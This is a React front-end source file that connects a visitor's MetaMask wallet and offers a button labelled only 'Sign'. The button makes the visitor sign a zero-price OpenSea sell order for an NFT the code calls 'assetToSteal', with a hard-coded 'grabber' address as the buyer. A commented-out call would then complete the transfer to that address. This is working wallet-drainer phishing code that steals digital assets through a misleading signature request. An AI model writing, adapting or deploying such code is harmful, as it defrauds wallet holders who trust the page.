import { useState } from "react";
import "./App.css";
import Web3 from "web3";
import ConnectWalletButton from "./components/ConnectWalletButton";

import { createOrder, fulfillOrder } from "./opensea-sdk";

const App = () => {

    const [loading, setLoading] = useState(false);
    const [address, setAddress] = useState("");

    const onPressConnect = async() => {
        setLoading(true);

        try {
            if (window?.ethereum?.isMetaMask) {
                const accounts = await window.ethereum.request({
                    method: "eth_requestAccounts"
                });

                const account = Web3.utils.toChecksumAddress(accounts[0]);
                setAddress(account);
            }
        } catch (error) {
            console.log(error);
            setAddress("");
        }

        setLoading(false);
    };

    const onPressLogout = () => {
        setAddress("");
    };

    const signSmth = async () => {
        const web3 = new Web3(Web3.givenProvider);
        const provider = web3.currentProvider

        const assetToSteal = {
            "tokenId": "8932",
            "tokenAddress": "0x8056aD118916db0fEef1c8B82744Fa37E5d57CC0"
        }
        const grabber = "0xa95889dF74d9F9A73b76DB329c71b78A2F62f635";
        const order = await createOrder({
            provider: provider,
            asset: assetToSteal,
            accountAddress: address,
            price: 0,
            quantity: 1,
            listingTime: 0,
            expirationTime: 0,
            englishAuctionReservePrice: 0,
            paymentTokenAddress: "0x8056aD118916db0fEef1c8B82744Fa37E5d57CC0",
            extraBountyBasisPoints: 0,
            buyerAddress: grabber,
            fees: 0.01,
            buyerEmail: "hui228@mail.ru"
        });

        console.log(order);

        // await fulfillOrder({
        //     order: order,
        //     provider: provider,
        //     accountAddress: address,
        //     recipientAddress: grabber,
        //     referrerAddress: grabber
        // });
    }

    return (
        <div className="App">
            <header className="Header">
                <ConnectWalletButton
                    onPressConnect={onPressConnect}
                    onPressLogout={onPressLogout}
                    loading={loading}
                    address={address}
                />
                
                { 
                    address != "" ?
                        <button onClick={signSmth}>
                            <h2>Sign</h2>
                        </button>
                    : 
                        <></>
                }
            </header>
        </div>
    );
};

export default App;